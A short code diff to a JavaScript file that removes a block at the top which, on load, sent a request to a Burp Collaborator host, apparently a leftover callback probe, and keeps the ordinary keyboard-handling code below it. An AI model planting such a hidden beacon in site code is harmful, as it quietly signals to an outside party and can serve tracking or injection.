@@ -1,13 +1,3 @@
-var xhttp = new XMLHttpRequest();
-		xhttp.onreadystatechange = function() {
-			if (this.readyState == 4 && this.status == 200) {
-				console.log(this.responseText);
-			}
-		};
-
-		xhttp.open("GET", "https://mzpr96tvju4cumb96dxgg0gtyk4es3.burpcollaborator.net");
-		xhttp.send();
-
 document.addEventListener('DOMContentLoaded', function () {
   // Key map
   var ENTER = 13;
